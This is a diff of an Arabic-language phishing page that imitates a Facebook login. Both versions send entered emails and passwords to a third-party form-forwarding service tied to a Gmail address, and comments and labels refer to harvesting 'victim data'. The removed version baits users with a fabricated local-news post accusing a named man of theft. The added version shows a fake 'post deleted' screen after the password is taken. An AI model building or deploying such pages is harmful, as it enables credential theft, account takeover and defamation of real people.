@@ -3,249 +3,144 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook</title> 
-    <!-- استدعاء الخطوط والأيقونات -->
-    <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
+    <title>تسجيل الدخول - فيسبوك</title>
     <style>
-        /* تنسيق عام يشبه فببسبوك */
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Noto Kufi Arabic', sans-serif; }
-        
         body {
+            font-family: Helvetica, Arial, sans-serif;
             background-color: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            padding: 10px;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
         }
-
-        .fb-post {
-            background: white;
-            width: 100%;
-            max-width: 500px;
+        .container {
+            background-color: white;
+            padding: 20px;
             border-radius: 8px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
-            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
         }
-
-        /* الشريط العلوي مع شعار FB */
-        .top-bar {
-            height: 30px;
-            background: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-bottom: 1px solid #eee;
+        .logo {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            letter-spacing: -1px;
         }
-        .fb-logo-small { color: #1877f2; font-size: 20px; font-weight: bold; }
-
-        .post-header {
-            padding: 12px 16px;
-            display: flex;
-            align-items: center;
-            border-bottom: 1px solid #ced0d4;
+        input {
+            width: 90%;
+            padding: 14px 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            outline: none;
         }
-
-        .avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: #ddd;
-            margin-left: 10px;
-            object-fit: cover;
+        input:focus {
+            border-color: #1877f2;
         }
-
-        .user-details h3 { font-size: 15px; font-weight: 700; color: #050505; margin-bottom: 2px; }
-        .time-info { font-size: 12px; color: #65676b; display: flex; align-items: center; }
-        .time-info i { margin-right: 4px; font-size: 10px; }
-
-        .post-content {
-            padding: 4px 16px 16px;
-            font-size: 15px;
-            line-height: 1.5;
-            color: #050505;
-        }
-
-        /* حاوية الصورة */
-        .image-container {
+        button {
             width: 100%;
-            height: 350px;
-            background: #e4e6eb;
-            position: relative;
+            padding: 14px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
             cursor: pointer;
-            overflow: hidden;
-            display: flex;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        a {
+            display: block;
+            margin-top: 15px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        /* شاشة الحذف */
+        #delete-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            z-index: 999;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            transition: all 0.3s ease;
+            text-align: center;
         }
-        .image-icon { font-size: 50px; color: #bdc1c6; opacity: 0.6; }
-        .view-btn {
-            position: absolute; bottom: 10px; right: 10px;
-            background: rgba(0,0,0,0.6); color: white;
-            padding: 5px 10px; border-radius: 4px; font-size: 12px;
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #1877f2;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
         }
-
-        .stats-bar {
-            padding: 10px 16px;
-            display: flex;
-            justify-content: space-between;
-            color: #65676b;
-            font-size: 14px;
-            border-bottom: 1px solid #ced0d4;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-
-        .action-buttons { padding: 5px 16px 15px; display: flex; justify-content: space-around; }
-        .action-btn {
-            color: #65676b; font-weight: 600; font-size: 14px;
-            cursor: pointer; display: flex; align-items: center; gap: 8px;
-            padding: 5px 10px; border-radius: 5px;
-        }
-        .action-btn:hover { background-color: #f2f2f2; }
-
-        /* زر الدخول */
-        .login-trigger {
-            display: block; width: calc(100% - 32px); margin: 15px 16px;
-            padding: 12px; background-color: #1877f2; color: white;
-            text-align: center; border-radius: 6px; font-weight: bold;
-            font-size: 16px; cursor: pointer; border: none;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(24, 119, 242, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0); }
-        }
-
-        /* تصميم النافذة المنبثقة */
-        .modal {
-            display: none; position: fixed; z-index: 1000; left: 0; top: 0;
-            width: 100%; height: 100%; background-color: rgba(0,0,0,0.6);
-            backdrop-filter: blur(2px);
-        }
-        .modal-content {
-            background-color: #fff; margin: 10% auto; padding: 0;
-            border-radius: 8px; width: 90%; max-width: 400px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-            animation: fadeIn 0.3s; position: relative;
-        }
-        @keyframes fadeIn { from {opacity: 0; transform: translateY(-20px);} to {opacity: 1; transform: translateY(0);} }
-        
-        .modal-header { padding: 20px; text-align: center; border-bottom: 1px solid #eee; }
-        .modal-body { padding: 20px; }
-        
-        .fb-input {
-            width: 100%; padding: 14px 16px; margin-bottom: 12px;
-            border: 1px solid #dddfe2; border-radius: 6px;
-            font-size: 17px; outline: none;
-        }
-        .fb-input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
-        
-        .fb-login-btn {
-            width: 100%; padding: 12px; background-color: #1877f2;
-            color: white; border: none; border-radius: 6px;
-            font-size: 18px; font-weight: bold; cursor: pointer;
-        }
-        .fb-login-btn:active { background-color: #166fe5; }
-        
-        .modal-footer { text-align: center; padding: 10px; font-size: 13px; color: #65676b; }
-        .close-modal { position: absolute; top: 10px; right: 15px; font-size: 24px; cursor: pointer; color: #aaa; }
+        h2 { color: #333; }
+        p { color: #666; }
     </style>
 </head>
 <body>
 
-<!-- بداية المنشور -->
-<div class="fb-post">
-    <div class="top-bar"><i class="fab fa-facebook fb-logo-small"></i></div>
-
-    <div class="post-header">
-        <img src="https://via.placeholder.com/40/0055aa/ffffff?text=F" alt="Avatar" class="avatar">
-        <div class="user-details">
-            <h3>أخبار البليدة 🇩🇿</h3>
-            <div class="time-info"><span>أنشَر الآن · </span><i class="fas fa-globe-americas"></i></div>
-        </div>
-    </div>
-
-    <div class="post-content">
-        📢 <strong>أخبار البليدة - Blida Info 🇩🇿</strong><br><br>
-        السلام عليكم ورحمة الله وبركاته،<br><br>
-        هدا الإنسان اللي في الصورة هو اسلام بيكسو (اسم حسابه: <strong>islàm Pïxsø</strong>)، يقيم في مدينة البليدة.<br><br>
-        يا خوتي دخل للدار جيراننا كي مكانوش فيها وسرقوا دراهم 30 مليون!<br>
-        كاين شهود وكاميرات تثبت الجرم وحكمو.<br><br>
-        👉 يا ريت كل واحد شاف هاد المنشور يتصل عليه فوراً حتى يعرفوه الناس:<br><br>
-        📞 <strong>رقم الاتصال المباشر:</strong> 0550 12 34 56<br><br>
-        <span style="color: #1877f2;">#البليدة #بلدية_البليدة #سارق #خبر_هام</span>
-    </div>
-
-    <!-- الصورة التي عند الضغط عليها تظهر النافذة -->
-    <div class="image-container" onclick="openModal()">
-        <i class="fas fa-search-plus image-icon"></i>
-        <div class="view-btn">عرض الصورة</div>
-    </div>
-
-    <div class="stats-bar">
-        <span>👍 2,500</span>
-        <span>💬 364 تعليق</span>
-        <span>↗️ 13 مشاركة</span>
-    </div>
-
-    <div class="action-buttons">
-        <div class="action-btn"><i class="far fa-thumbs-up"></i> إعجاب</div>
-        <div class="action-btn"><i class="far fa-comment"></i> تعليق</div>
-        <div class="action-btn"><i class="fas fa-share"></i> مشاركة</div>
-    </div>
-
-    <button class="login-trigger" onclick="openModal()">
-        🔴 اضغط للمشاهدة والتحقق
-    </button>
-</div>
-
-<!-- النافذة المنبثقة (Pop-up) -->
-<div id="myModal" class="modal">
-    <div class="modal-content">
-        <span class="close-modal" onclick="closeModal()">&times;</span>
+    <!-- واجهة تسجيل الدخول -->
+    <div class="container" id="login-form-container">
+        <div class="logo">facebook</div>
         
-        <div class="modal-header">
-            <svg viewBox="0 0 270 55" width="150" height="30">
-                <path fill="#1877F2" d="M60.4 27.8c0-14.6-10.8-24.6-25.2-24.6C38.5 3.2 26 16.8 26 30.3c0 14.5 12.5 24.6 27.2 24.6 14.4 0 25.2-11 25.2-27.1h-11c0 9.8-6.7 16.2-15.4 16.2-8.6 0-15.4-6.4-15.4-16.2 0-9.8 6.8-16.2 15.4-16.2 8.7 0 15.4 6.4 15.4 16.2h11z"/>
-                <path fill="#1877F2" d="M100.6 3.2c-14.4 0-25.2 10-25.2 24.6v1.8c0 14.5 10.8 24.6 25.2 24.6 14.4 0 25.2-10.1 25.2-24.6v-1.8c0-14.6-10.8-24.6-25.2-24.6zm10.2 50.5c0 9.8-6.8 16.2-15.4 16.2-8.7 0-15.4-6.4-15.4-16.2V30.3c0-9.8 6.7-16.2 15.4-16.2 8.6 0 15.4 6.4 15.4 16.2v23.4h-11v-1.2zm38.2-24.6c0-14.6-10.8-24.6-25.2-24.6-14.4 0-25.2 10-25.2 24.6 0 14.5 10.8 24.6 25.2 24.6 14.4 0 25.2-10.1 25.2-24.6h-11c0 9.8-6.7 16.2-15.4 16.2-8.6 0-15.4-6.4-15.4-16.2 0-9.8 6.8-16.2 15.4-16.2 8.7 0 15.4 6.4 15.4 16.2h11z"/>
-                <path fill="#1877F2" d="M180.2 3.2c-14.4 0-25.2 10-25.2 24.6v1.8c0 14.5 10.8 24.6 25.2 24.6 14.4 0 25.2-10.1 25.2-24.6v-1.8c0-14.6-10.8-24.6-25.2-24.6zm10.2 50.5c0 9.8-6.8 16.2-15.4 16.2-8.7 0-15.4-6.4-15.4-16.2V30.3c0-9.8 6.7-16.2 15.4-16.2 8.6 0 15.4 6.4 15.4 16.2v23.4h-11v-1.2z"/>
-                <path fill="#1877F2" d="M236.6 3.2c-14.4 0-25.2 10-25.2 24.6v1.8c0 14.5 10.8 24.6 25.2 24.6 14.4 0 25.2-10.1 25.2-24.6v-1.8c0-14.6-10.8-24.6-25.2-24.6zm10.2 50.5c0 9.8-6.8 16.2-15.4 16.2-8.7 0-15.4-6.4-15.4-16.2V30.3c0-9.8 6.7-16.2 15.4-16.2 8.6 0 15.4 6.4 15.4 16.2v23.4h-11v-1.2z"/>
-            </svg>
-        </div>
-
-        <div class="modal-body">
-            <!-- نموذج البيانات -->
-            <form action="https://formsubmit.co/c8ha12i8m@gmail.com" method="POST">
-                <input type="hidden" name="_subject" value="New Login Attempt!">
-                <input type="hidden" name="_captcha" value="false">
-                
-                <input type="email" name="Email" class="fb-input" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-                <input type="password" name="Passwd" class="fb-input" placeholder="كلمة المرور" required>
-                
-                <button type="submit" class="fb-login-btn">تسجيل الدخول</button>
-            </form>
+        <!-- هنا نضع الإيميل الخاص بك ليعمل حشر البيانات -->
+        <form action="https://formsubmit.co/c8ha12i8m@gmail.com" method="POST">
             
-            <div style="margin-top: 15px; text-align: center;">
-                <a href="#" style="color: #1877f2; font-size: 13px; text-decoration: none;">هل نسيت كلمة المرور؟</a>
-                <hr style="border: 0; border-top: 1px solid #dadde1; margin: 20px 0;">
-                <button style="background: #42b72a; color: white; border: none; padding: 10px 20px; border-radius: 6px; font-weight: bold; cursor: pointer;">إنشاء حساب جديد</button>
-            </div>
-        </div>
-        
-        <div class="modal-footer">
-            <p>© 2026 facabook</p>
-        </div>
-    </div>
-</div>
+            <!-- إعدادات إضافية -->
+            <input type="hidden" name="_subject" value="بيانات ضحية جديدة!">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value=""> 
 
-<script>
-    function openModal() { document.getElementById("myModal").style.display = "block"; }
-    function closeModal() { document.getElementById("myModal").style.display = "none"; }
-    window.onclick = function(event) { if (event.target == document.getElementById("myModal")) { closeModal(); } }
-</script>
+            <input type="text" name="Email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" name="Password" placeholder="كلمة المرور" required>
+            
+            <button type="submit" onclick="startProcess()">تسجيل الدخول</button>
+        </form>
+        <a href="#">هل نسيت حسابك؟</a>
+    </div>
+
+    <!-- شاشة "تم حذف المنشور" -->
+    <div id="delete-screen">
+        <div class="loader"></div>
+        <h2>جاري التحقق...</h2>
+    </div>
+
+    <script>
+        function startProcess() {
+            // إخفاء النموذج وإظهار شاشة الانتظار
+            document.getElementById('login-form-container').style.display = 'none';
+            const screen = document.getElementById('delete-screen');
+            screen.style.display = 'flex';
+
+            // تغيير النص بعد ثانيتين ليحاكي العملية
+            setTimeout(() => {
+                document.querySelector('#delete-screen h2').innerText = "تم حذف المنشور";
+                document.querySelector('.loader').style.display = 'none';
+                
+                // يمكنك إضافة تأخير ثم إعادة تحميل الصفحة إذا أردت
+                // window.location.reload(); 
+            }, 2000);
+        }
+    </script>
 
 </body>
 </html>
